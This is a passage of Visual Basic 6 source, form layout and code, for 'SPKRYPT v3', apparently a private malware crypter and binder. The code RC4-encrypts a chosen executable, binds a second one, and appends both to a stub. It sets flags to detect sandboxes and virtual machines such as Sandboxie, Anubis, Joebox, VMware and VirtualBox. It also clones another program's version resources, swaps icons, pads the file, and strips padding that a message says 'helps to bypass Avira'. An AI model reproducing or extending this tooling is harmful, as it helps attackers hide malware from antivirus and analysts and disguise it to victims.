         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.FlatEdit txtIcon 
            Height          =   255
            Left            =   240
            TabIndex        =   35
            Top             =   720
            Width           =   4095
            _Version        =   851970
            _ExtentX        =   7223
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Enabled         =   0   'False
            Text            =   "Click to browse for custom icon..."
         End
         Begin XtremeSuiteControls.CheckBox chkIcon 
            Height          =   255
            Left            =   240
            TabIndex        =   36
            Top             =   360
            Width           =   1335
            _Version        =   851970
            _ExtentX        =   2355
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Change Icon?"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
         End
         Begin VB.Image Image6 
            Height          =   240
            Left            =   240
            Picture         =   "frmMain.frx":18106
            Top             =   0
            Width           =   240
         End
      End
      Begin XtremeSuiteControls.GroupBox grpFile 
         Height          =   1095
         Left            =   120
         TabIndex        =   10
         Top             =   360
         Width           =   4695
         _Version        =   851970
         _ExtentX        =   8281
         _ExtentY        =   1931
         _StockProps     =   79
         Caption         =   "      Choose File"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Begin XtremeSuiteControls.PushButton cmdFile 
            Height          =   255
            Left            =   3480
            TabIndex        =   11
            Top             =   480
            Width           =   1095
            _Version        =   851970
            _ExtentX        =   1931
            _ExtentY        =   450
            _StockProps     =   79
            Caption         =   "Browse"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            UseVisualStyle  =   -1  'True
            Picture         =   "frmMain.frx":18229
         End
         Begin XtremeSuiteControls.FlatEdit txtFile 
            Height          =   255
            Left            =   240
            TabIndex        =   12
            Top             =   480
            Width           =   3135
            _Version        =   851970
            _ExtentX        =   5530
            _ExtentY        =   450
            _StockProps     =   77
            BackColor       =   -2147483643
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Image Image11 
            Height          =   240
            Left            =   120
            Picture         =   "frmMain.frx":18351
            Top             =   0
            Width           =   240
         End
      End
      Begin VB.Image Image10 
         Height          =   240
         Left            =   120
         Picture         =   "frmMain.frx":185BE
         Top             =   0
         Width           =   240
      End
   End
   Begin XtremeSuiteControls.PushButton cmdExit 
      Height          =   375
      Left            =   5640
      TabIndex        =   1
      Top             =   5640
      Width           =   1815
      _Version        =   851970
      _ExtentX        =   3201
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Exit"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":189AC
   End
   Begin XtremeSuiteControls.PushButton cmdCrypt 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   5640
      Width           =   5415
      _Version        =   851970
      _ExtentX        =   9551
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Crypt"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Picture         =   "frmMain.frx":18ACA
   End
   Begin XtremeSuiteControls.GroupBox GroupBox1 
      Height          =   3975
      Left            =   120
      TabIndex        =   48
      Top             =   1440
      Width           =   2415
      _Version        =   851970
      _ExtentX        =   4260
      _ExtentY        =   7011
      _StockProps     =   79
      Caption         =   "         Options"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.PushButton cmdExtra 
         Height          =   375
         Left            =   120
         TabIndex        =   55
         Top             =   3480
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Extra's"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":18F0A
      End
      Begin XtremeSuiteControls.PushButton cmdAntis 
         Height          =   375
         Left            =   120
         TabIndex        =   53
         Top             =   2880
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Anti's"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":19321
      End
      Begin XtremeSuiteControls.PushButton cmdEnc 
         Height          =   375
         Left            =   120
         TabIndex        =   49
         Top             =   2280
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Encryption"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":1959C
      End
      Begin XtremeSuiteControls.PushButton cmdEOF 
         Height          =   375
         Left            =   120
         TabIndex        =   50
         Top             =   1680
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Read EOF"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":19802
      End
      Begin XtremeSuiteControls.PushButton PushButton1 
         Height          =   375
         Left            =   120
         TabIndex        =   51
         Top             =   1080
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Icon / File Cloner"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":19925
      End
      Begin XtremeSuiteControls.PushButton cmdFilesTabs 
         Height          =   375
         Left            =   120
         TabIndex        =   52
         Top             =   480
         Width           =   2175
         _Version        =   851970
         _ExtentX        =   3836
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Crypter  / Binder"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":19A36
      End
      Begin VB.Image Image14 
         Height          =   240
         Left            =   240
         Picture         =   "frmMain.frx":19B64
         Top             =   0
         Width           =   240
      End
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H00E0E0E0&
      BackStyle       =   1  'Opaque
      BorderStyle     =   0  'Transparent
      FillColor       =   &H00808080&
      Height          =   855
      Left            =   0
      Top             =   5520
      Width           =   7575
   End
   Begin VB.Image Image1 
      Height          =   1290
      Left            =   0
      Picture         =   "frmMain.frx":19F67
      Top             =   0
      Width           =   8175
   End
   Begin XtremeSuiteControls.CommonDialog BindDialog 
      Left            =   0
      Top             =   2280
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog CloneDialog 
      Left            =   0
      Top             =   2040
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog IconDialog 
      Left            =   0
      Top             =   1800
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog SaveDialog 
      Left            =   0
      Top             =   1560
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog StubDialog 
      Left            =   0
      Top             =   1320
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
   Begin XtremeSuiteControls.CommonDialog CD 
      Left            =   0
      Top             =   1080
      _Version        =   851970
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
      DialogStyle     =   1
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
''/==== APIs & Stuff ====/
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" _
                        (ByVal lpFileName As String) _
                         As Long
Const L1 = "abcdefghijklmnopqrstuvwxyz"
Const L2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const L3 = "{[]}\*/-+1234567890,.-;:_'*~#!§$%&/()=?"

Private Sub chkBind_Click()
If txtBind.Enabled = False Then
txtBind.Enabled = True
cmdBind.Enabled = True
Else
txtBind.Enabled = False
cmdBind.Enabled = False
 
End If
End Sub

Private Sub chkClone_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtClone.Enabled = False Then
       txtClone.Enabled = True
       Else
       txtClone.Enabled = False
       End If
End Sub

Private Sub chkIcon_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtIcon.Enabled = False Then
       txtIcon.Enabled = True
       Else
       txtIcon.Enabled = False
       End If
End Sub

Private Sub chkPADX_Click()
MsgBox "When using this option, the crypted file will not be executable until you have clicked the 'Exit' button on the crypter", vbCritical
End Sub

Private Sub chkPump_Click()
If txtPump.Enabled = False Then
txtPump.Enabled = True
cmdMore.Enabled = True
cmdLess.Enabled = True
cmdLess100.Enabled = True
cmdMore100.Enabled = True
Else
txtPump.Text = "0"
txtPump.Enabled = False
cmdMore.Enabled = False
cmdLess.Enabled = False
cmdLess100.Enabled = False
cmdMore100.Enabled = False
End If
End Sub

Private Sub chkRPE_Click()

If chkSections.Enabled = True Then
s1.Enabled = False
txtS1.Enabled = False
chkSections.Enabled = False
chkSections.Value = xtpUnchecked
method2.Enabled = False

Else
chkSections.Enabled = True
End If
End Sub

Private Sub chkSections_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtS1.Enabled = False Then
       txtS1.Enabled = True
       s1.Enabled = True
       method2.Enabled = True
       
       Else
       txtS1.Enabled = False
       s1.Enabled = False
       method2.Enabled = False
       
       End If
       
       If chkRPE.Enabled = True Then
       chkRPE.Value = xtpUnchecked
       chkRPE.Enabled = False
       Else: chkRPE.Enabled = True
       End If
       
End Sub

Private Sub chkStub_Click()
       '/==== If textbox is disabled, enable, else, disable ====/
       If txtStub.Enabled = False Then
       txtStub.Enabled = True
       Else
       txtStub.Enabled = False
       End If
End Sub


Public Function rEOF(sInput As String) As String
  On Error GoTo err:
  Dim sB As String
  Dim n As Integer
  Dim sFB As String, sEh As String, sChar As String
  Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
  If Dir(sInput) = "" Then GoTo err
  lFF = FreeFile
  Open sInput For Binary As #lFF
  sFB = Space(LOF(lFF))
  Get #lFF, , sFB
  Close #lFF
  For n = 1 To 30
  sB = sB & Chr(0)
  Next
  lPos = InStr(1, StrReverse(sFB), sB)
  sEh = (Mid$(StrReverse(sFB), 1, lPos - 1))
  rEOF = StrReverse(sEh)
  Exit Function
err: rEOF = vbNullString
End Function
Public Function sEOF(sInput As String, sOut As String) As Long
  On Error Resume Next
  Dim sBuf As String
  Dim i As Integer
  Dim iFile As Long, lPos As Long, lPos2 As Long, lCount As Long
  Dim sFB As String, sEh As String, sChar As String, lsEOF As String, FB As String
  If Dir(sInput) = "" Then Exit Function
  If Dir(sOut) = "" Then Exit Function
  iFile = FreeFile
  Open sInput For Binary As #iFile
  sFB = Space(LOF(iFile))
  Get #iFile, , sFB
  Close #iFile
  For i = 1 To 30
  sBuf = sBuf & Chr(0)
  Next
  lPos = InStr(1, StrReverse(sFB), sBuf)
  sEh = (Mid$(StrReverse(sFB), 1, lPos - 1))
  lsEOF = StrReverse(sEh)
  Open sOut For Binary As #iFile
  FB = Space(LOF(iFile))
  Get #iFile, , FB
  Close #iFile
  Open sOut For Binary As #iFile
  Put #iFile, , FB & lsEOF
  Close #iFile
End Function

Private Sub cmdAntis_Click()
grpPump.Visible = False
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False

grpAnti.Visible = True

End Sub

Private Sub cmdBind_Click()
        '/==== Browse for file ====/
        On Error Resume Next
        BindDialog.CancelError = True
        BindDialog.DefaultExt = ".exe"
        BindDialog.DialogTitle = "Select file(s) to crypt"
        BindDialog.Filter = "Executable files (*.exe)|*.exe"
        BindDialog.ShowOpen
        
        '/==== Exit if no file is selected ====/
        If BindDialog.FileName = vbNullString Then Exit Sub
    
        txtBind.Text = BindDialog.FileName
End Sub

Public Function ReadTextFile(strpath As String) As String
    On Error GoTo ErrTrap
    Dim intFileNumber As Integer
    
    If Dir(strpath) = "" Then Exit Function
    intFileNumber = FreeFile
    Open strpath For Input As #intFileNumber
    
    ReadTextFile = Input(LOF(intFileNumber), #intFileNumber)
ErrTrap:
    Close #intFileNumber
End Function
Private Sub cmdCrypt_Click()
        '/==== Check if file is selected ====/
        If txtFile.Text = vbNullString Then
        MsgBox "No file is selected.", vbCritical
        Exit Sub
        End If

        '/==== Variables ====/
        Dim AntiData  As String
        Dim StubString As String
        Dim RC4 As New RC4
        Dim Error As String
        Dim PathStub As String
        Dim FileData As String
        Dim BindData As String
        Dim F As Integer
        'Dim txtSplitKey As String
        F = FreeFile
        'txtSplitKey = txtSplitKey.Text
        
        '/==== Save Dialog ====/
        With SaveDialog
        On Error Resume Next
        .CancelError = True
        .DefaultExt = ".exe"
        .Filter = "Executables Files (*.exe)|*.exe|SCR Files (*.scr)|*.scr|COM Files (*.com)|*.com|BAT Files (*.bat)|*.bat|PIF Files (*.pif)|*.pif|"
        .FileName = "Encrypted.exe"
        .ShowSave
        End With

        '/==== Custom Stub ====/
        If chkStub.Value = xtpChecked Then
        PathStub = StubDialog.FileName
        Else
        PathStub = App.path & "\Stub.exe"
        End If
        Open PathStub For Binary As #1
        StubString = Space(LOF(1))
        Get #1, , StubString
        Close #1


        '/==== Get all files in list ====/
        FileData = txtFile.Text
        Open FileData For Binary As #1
        FileData = Space(LOF(1))
        Get #1, , FileData
        Close #1
        
        '/==== Get bind files  ====/
        BindData = txtBind.Text
        Open BindData For Binary As #1
        BindData = Space(LOF(1))
        Get #1, , BindData
        Close #1

        FileData = RC4.EncryptString(FileData, txtKey.Text)
        BindData = RC4.EncryptString(BindData, txtKey.Text)
        
        
       '/==== Checks Anti's and sets data for them ====/
        AntiData = chkSandboxie.Value & "ANTIS" & chkThreatExpert.Value & "ANTIS" & chkAnubis.Value & "ANTIS" & chkCWSandbox.Value & "ANTIS" & chkJoebox.Value & "ANTIS" & chkVMware.Value & "ANTIS" & chkVPC.Value & "ANTIS" & chkVBox.Value & "ANTIS"


        ' Encrypts the file method 2
        
        Open SaveDialog.FileName For Binary As #F
        
        'Put #F, , StubString & txtSplitKey
        'Put #F, , AntiData
        'Put #F, LOF(F) + 1, txtSplitKey
        'Put #F, , RC4.EncryptString(sBuff(i), "SPKPASS")
        
        Put #F, , StubString & txtSplitKey 'txtSplitKey
        Put #F, , AntiData & txtSplitKey 'txtSplitKey
        'Put #F, LOF(F) + 1, txtSplitKey
        Put #F, , txtKey.Text & txtSplitKey 'txtSplitKey
        Put #F, , FileData & txtSplitKey 'txtSplitKey
        Put #F, , BindData & txtSplitKey
        ' If RealignPE = Checked /
        Close #F

        

        If chkRPE.Value = xtpChecked Then
        Call RealignPEFromFile(SaveDialog.FileName)
        End If


        
        Dim sBuffer() As Byte
        sBuffer = LoadResData(101, "CUSTOM")
        Open App.path & "\Reshacker.exe" For Binary As #F
        Put #F, , sBuffer
        Close #F


        If chkClone.Value = xtpChecked Then
        Shell (App.path & "\Reshacker.exe -extract " & txtClone.Text & "," & App.path & "\info.res" & ",VERSIONINFO,,") ' extract ressource info of source
        Shell (App.path & "\Reshacker.exe -delete " & SaveDialog.FileName & "," & SaveDialog.FileName & ",VERSIONINFO,,") ' delete ressource info of destination
        Shell (App.path & "\Reshacker.exe -addoverwrite " & SaveDialog.FileName & "," & SaveDialog.FileName & "," & App.path & "\info.res" & ",VERSIONINFO,1,") 'clone ressource info
        End If


        If chkIcon.Value = xtpChecked Then
        Call ChangeIcon2(SaveDialog.FileName, txtIcon.Text)
        End If


        If Dir(App.path & "\info.res") <> "" Then Kill App.path & "\info.res"
        If Dir(App.path & "\Reshacker.log") <> "" Then Kill App.path & "\Reshacker.log"
        If Dir(App.path & "\Reshacker.ini") <> "" Then Kill App.path & "\Reshacker.ini"
        
        '/ Remove PADX /
        If chkPADX.Value = xtpChecked Then
        Call AntiPADDING(SaveDialog.FileName)
        End If
        
        
        '/ EOF /
        If chkEOF.Value = xtpChecked Then
        sEOF CD.FileName, SaveDialog.FileName
        End If
        
        '/ Add Sections /
        If chkSections.Value = xtpChecked Then
        Call AddSection(SaveDialog.FileName, txtS1.Text, Len(FileData), &H9)
        If method2.Value = xtpChecked Then
        Call AddSection(SaveDialog.FileName, txtS1.Text & "2", Len(FileData), &H9)
        End If
        End If
        
        If chkPump.Value = xtpChecked Then
        If txtPump.Text <> "0" Then
        Bytes = txtPump.Text * 100
        
        For i = 1 To Bytes
        Open SaveDialog.FileName For Append As #1
            Print #1, LOF(1), " "
        Close #1
        Next i
        End If
        End If
        DeleteFile (App.path & "\Reshacker.exe")
        
        
        '/ Finish /
        MsgBox "Successfully crypted!"

        

        
End Sub

Private Sub cmdEnc_Click()

grpPump.Visible = False
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False

grpEnc.Visible = True
grpAlgo.Visible = True

End Sub

Private Sub cmdEOF_Click()
grpPump.Visible = False
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False


grpEOF.Visible = True


End Sub

Private Sub cmdEOFHelp_Click()
        MsgBox "Only your main file's EOF will be patched, not the binded.", vbInformation
End Sub

Private Sub cmdExit_Click()

End
Unload Me

End Sub






Private Sub cmdExtra_Click()
grpPump.Visible = False
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False

grpExtra.Visible = True
grpSections.Visible = True
grpPump.Visible = True

End Sub

Private Sub cmdFile_Click()
        '/==== Browse for file ====/
        On Error Resume Next
        CD.CancelError = True
        CD.DefaultExt = ".exe"
        CD.DialogTitle = "Select file(s) to crypt"
        CD.Filter = "Executable files (*.exe)|*.exe"
        CD.ShowOpen
        
        '/==== Exit if no file is selected ====/
        If CD.FileName = vbNullString Then Exit Sub
    
        txtFile.Text = CD.FileName
        txtREOF.Text = rEOF(CD.FileName)
End Sub

Private Sub cmdFilesTabs_Click()
grpPump.Visible = False
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False

grpFile.Visible = True
grpBind.Visible = True
grpStub.Visible = True

End Sub

Private Sub cmdGenKey_Click(Index As Integer)
txtKey.Text = sRandom
End Sub

Private Sub cmdS1_Click(Index As Integer)
txtS1.Text = sRandom2

End Sub

Private Sub cmdHelpRADX_Click()
MsgBox "Removes the PADDINGX on the end of file, which helps to bypass Avira", vbInformation
End Sub


Function RandomString(cb As Integer) As String

    Randomize
    Dim rgch As String
    rgch = "abcdefghijklmnopqrstuvwxyz"
    rgch = rgch & UCase(rgch) & "0123456789"

    Dim i As Long
    For i = 1 To cb
        RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next

End Function
Public Function StringToHex(ByVal StrToHex As String) As String
Dim strTemp   As String
Dim strReturn As String
Dim i         As Long
    For i = 1 To Len(StrToHex)
        strTemp = Hex$(Asc(Mid$(StrToHex, i, 1)))
        If Len(strTemp) = 1 Then strTemp = "0" & strTemp
        strReturn = strReturn & Space$(1) & strTemp
    Next i
    StringToHex = strReturn
End Function

Private Sub cmdLess_Click()
If txtPump.Text <> "0" Then
txtPump.Text = txtPump.Text - 1
End If
End Sub

Private Sub cmdLess100_Click()
If txtPump.Text <> "0" Then
txtPump.Text = txtPump.Text - 100
End If
End Sub

Private Sub cmdMore_Click()
txtPump.Text = txtPump.Text + 1
End Sub

Private Sub cmdMore100_Click()
txtPump.Text = txtPump.Text + 100
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub PushButton1_Click()
grpPump.Visible = False
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False

grpIcon.Visible = True
grpClone.Visible = True

End Sub

Private Sub PushButton2_Click()
grpFile.Visible = False
grpBind.Visible = False
grpStub.Visible = False
grpSections.Visible = False
grpAlgo.Visible = False
grpAnti.Visible = False
grpEnc.Visible = False
grpIcon.Visible = False
grpExtra.Visible = False
grpEOF.Visible = False
grpClone.Visible = False

grpEnc.Visible = True
grpAlgo.Visible = True

End Sub

Private Sub s1_Click()
txtS1.Text = "." & sRandom2

End Sub

Private Sub s2_Click()
txtS2.Text = "." & sRandom2
End Sub



Private Sub txtAlgo_MouseMove(Button As Integer, Shift As Integer, X As Single, y As Single)
Dim Generated As String
Generated = StringToHex(RandomString(171))
txtAlgo.Text = Generated
End Sub


Private Sub txtClone_Click()
        '/==== Open the CloneDialog, and set txtClone to ClonePath ====/
        CloneDialog.DefaultExt = ".exe"
        CloneDialog.DialogTitle = "Open File to Clone"
        CloneDialog.Filter = "Executable Files (*.exe)|*.exe"
        CloneDialog.ShowOpen
        '/==== Is the dialog blank, eg. no file selected? ====/
        If CloneDialog.FileName = vbNullString Then Exit Sub
        '/==== Set text of StubPath ====/
        txtClone.Text = CloneDialog.FileName
End Sub

Private Sub txtIcon_Click()
        '/==== Open the IconDialog, and set txtIcon to IconPath ====/
        IconDialog.DefaultExt = ".ico"
        IconDialog.DialogTitle = "Open Icon"
        IconDialog.Filter = "Icons (*.ico)|*.ico"
        IconDialog.ShowOpen
        '/==== Is the dialog blank, eg. no file selected? ====/
        If IconDialog.FileName = vbNullString Then Exit Sub
        '/==== Set text of StubPath ====/
        txtIcon.Text = IconDialog.FileName
End Sub

Private Sub Form_Load()
        txtKey.Text = sRandom
        txtS1.Text = "." & sRandom2

        '/ Set title to username /
        Me.Caption = "SPKRYPT v3    |    Private version for: " & frmLogin.txtUser.Text
        
                Dim Generated As String
        Generated = StringToHex(RandomString(171))
        txtAlgo.Text = Generated
End Sub


Private Sub txtStub_Click()
        '/==== Open the StubDialog, and set txtStub to StubPath ====/
        StubDialog.DefaultExt = ".exe"
        StubDialog.DialogTitle = "Open PE File"
        StubDialog.Filter = "Executables (*.exe)|*.exe"
        StubDialog.ShowOpen
        '/==== Is the dialog blank, eg. no file selected? ====/
        If StubDialog.FileName = vbNullString Then Exit Sub
        '/==== Set text of StubPath ====/
        
        If FileExists(StubDialog.FileTitle & ".SpKSettings") = False Then
        MsgBox "Could not find the stub settings, make sure you haven't deleted it!", vbCritical
        Exit Sub
        End If
        txtStub.Text = StubDialog.FileName
        Dim path As String
        path = Replace(StubDialog.FileName, StubDialog.FileTitle & ".exe", vbNullString)
        txtSplitKey.Text = Replace(ReadTextFile(path & StubDialog.FileTitle & ".SpKSettings"), vbNewLine, vbNullString)
End Sub
Public Function sRandom()
        '/==== Generate a random key ====/
        Dim Shitz As String
        Dim i As Integer

        Shitz = L1 + L2 + L3

        For i = 1 To 26
        Randomize
        sRandom = sRandom & Mid$(Shitz, Int((Rnd * Len(Shitz)) + 1), 1)
        Next i
End Function
Public Function sRandom2()
        '/==== Generate a random key for sections====/
        Dim Shitz As String
        Dim i As Integer

        Shitz = L1 + L2

        For i = 1 To 5
        sRandom2 = sRandom2 & Mid$(Shitz, Int((Rnd * Len(Shitz)) + 1), 1)
        Next i
End Function
